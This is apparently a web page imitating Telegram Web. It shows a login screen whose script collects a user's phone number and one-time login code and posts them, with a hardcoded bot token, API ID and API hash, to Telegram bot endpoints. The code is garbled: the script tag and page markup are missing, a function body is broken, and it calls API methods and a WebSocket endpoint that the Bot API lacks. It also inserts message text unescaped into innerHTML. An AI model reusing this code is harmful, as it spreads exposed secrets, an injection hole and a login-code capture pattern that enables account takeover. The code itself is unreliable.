<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        :root {
            --dark: #17212b;
            --gray: #242f3d;
            --light: #aaa;
            --accent: #2b5278;
            --light-purple: #8774e1;
            --dark-purple: #4b367c;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: var(--dark);
            color: white;
            height: 100vh;
        }

        .container {
            display: flex;
            height: 100vh;
        }

        .login-screen {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: var(--dark);
        }

        .login-container {
            background: var(--gray);
            padding: 30px;
            border-radius: 15px;
            width: 100%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-header img {
            width: 100px;
            height: 100px;
            margin-bottom: 10px;
        }

        .login-input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            background: var(--dark);
            color: white;
            font-size: 16px;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: var(--accent);
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .login-button:hover {
            background: var(--light-purple);
        }

        .verification-container {
            text-align: center;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid var(--light);
            border-top: 4px solid var(--accent);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Стили для основного приложения */
        .sidebar {
            width: 300px;
            background: var(--gray);
            border-right: 1px solid var(--accent);
            display: flex;
            flex-direction: column;
        }

        .message-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: var(--dark);
        }

        .messages-container {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
        }

        .message-input {
            padding: 20px;
            background: var(--gray);
            display: flex;
            gap: 10px;
        }

        .message-input input {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: var(--dark);
            color: white;
        }

        .send-button {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            background: var(--accent);
            color: white;
            cursor: pointer;
        }

        /* Добавленные стили */
        .button-group, .toolbar {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }

        .action-button, .toolbar-button {
            padding: 10px 15px;
            border: none;
            border-radius: 8px;
            background: var(--accent);
            color: white;
            cursor: pointer;
            transition: all 0.3s;
        }

        .action-button:hover, .toolbar-button:hover {
            background: var(--light-purple);
            transform: scale(1.05);
        }

        .privacy-policy {
            font-size: 12px;
            color: var(--light);
            text-align: center;
            margin-top: 20px;
        }

        .privacy-link {
            color: var(--light-purple);
            text-decoration: none;
        }

        .modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: var(--gray);
            padding: 30px;
            border-radius: 15px;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            color: white;
        }
    </style>
</head>
<body>

        // Конфигурация API
        const API_ID = '23258474';
        const API_HASH = 'f5dd3f52675030a650ca2259f9fb79ce';
        const BOT_TOKEN = '7893025918:AAEZCxvHKXpsiKc1NHbMg7h0hTMvLg34Nlg';
        
        // Базовый URL API
        const API_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

        async function requestTelegramCode() {
            const phone = document.getElementById('phoneInput').value;
            if (!phone.match(/^\+[1-9]\d{1,14}$/)) {
                alert('Please enter a valid phone number');
                return;
            }

            try {
                document.getElementById('loading').style.display = 'block';
                
                const response = await fetch(`${API_URL}/sendCode`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone_number: phone,
                        api_id: API_ID,
                        api_hash: API_HASH
                    })
                });

                const data = await response.json();
                
                if (data.ok) {
                    document.getElementById('phoneStep').style.display = 'none';
                    document.getElementById('codeStep').style.display = 'block';
                    localStorage.setItem('phoneHash', data.result.phone_code_hash);
                } else {
                    alert('Error: ' + data.description);
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error sending code. Please try again.');
            } finally {
                document.getElementById('loading').style.display = 'none';
            }
        }

        async function verifyTelegramCode() {
            const code = document.getElementById('codeInput').value;
            if (!code.match(/^\d{5}$/)) {
                alert('Please enter a valid 5-digit code');
                return;
            }

            try {
                document.getElementById('loading').style.display = 'block';
                
                const phone = document.getElementById('phoneInput').value;
                const phoneHash = localStorage.getItem('phoneHash');

                const response = await fetch(`${API_URL}/signIn`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone_number: phone,
                        phone_code_hash: phoneHash,
                        phone_code: code,
                        api_id: API_ID,
                        api_hash: API_HASH
                    })
                });

                const data = await response.json();
                
                if (data.ok) {
                    localStorage.setItem('telegramUser', JSON.stringify(data.result.user));
                    document.getElementById('loginScreen').style.display = 'none';
                    document.getElementById('mainApp').style.display = 'flex';
                    initializeApp();
                } else {
                    alert('Error: ' + data.description);
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Invalid code. Please try again.');
            } finally {
                document.getElementById('loading').style.display = 'none';
            }
        }

        function initializeApp() {
            loadChats();
            initializeWebSocket();
            setupEventListeners();
        }

        async function loadChats() {
            try {
                const response = await fetch(`${API_URL}/getChats`, {
                    headers: {
                        'Authorization': `Bearer ${BOT_TOKEN}`
                    }
                });
                const data = await response.json();
                
                if (data.ok) {
                    displayChats(data.result);
                }
            } catch (error) {
                console.error('Error loading chats:', error);
            }
        }

        function displayChats(chats) {
            const chatList = document.getElementById('chatList');
            chatList.innerHTML = '';
            
            chats.forEach(chat => {
                const chatElement = document.createElement('div');
                chatElement.className = 'chat-item';
                chatElement.innerHTML = `
                    <div class="chat-avatar">${chat.title[0]}</div>
                    <div class="chat-info">
                        <div class="chat-title">${chat.title}</div>
                        <div class="chat-last-message">${chat.last_message || ''}</div>
                    </div>
                `;
                chatList.appendChild(chatElement);
            });
        }

        function initializeWebSocket() {
            const ws = new WebSocket(`wss://api.telegram.org/bot${BOT_TOKEN}/updates`);
            
            ws.onmessage = (event) => {
                const update = JSON.parse(event.data);
                handleUpdate(update);
            };
            
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
        }

        function handleUpdate(update) {
            if (update.message) {
                displayNewMessage(update.message);
            }
        }

        function displayNewMessage(message) {
            const messagesContainer = document.getElementById('messagesContainer');
            const messageElement = document.createElement('div');
            messageElement.className = 'message';
            messageElement.innerHTML = `
                <div class="message-sender">${message.from.first_name}</div>
                <div class="message-text">${message.text}</div>
                <div class="message-time">${new Date(message.date * 1000).toLocaleTimeString()}</div>
            `;
            messagesContainer.appendChild(messageElement);
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }

        async function sendMessage() {
            const messageInput = document.getElementById('messageInput');
            const text = messageInput.value.trim();
            
            if (!text) return;

            try {

                }
            } catch (error) {
                console.error('Error sending message:', error);
                alert('Error sending message. Please try again.');
            }
        }

        function setupEventListeners() {
            document.getElementById('messageInput').addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    sendMessage();
                }
            });
        }

        // Инициализация при загрузке страницы
        document.addEventListener('DOMContentLoaded', () => {
            const user = localStorage.getItem('telegramUser');
            if (user) {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('mainApp').style.display = 'flex';
                initializeApp();
            }
        });
    </script>

</body>
</html>
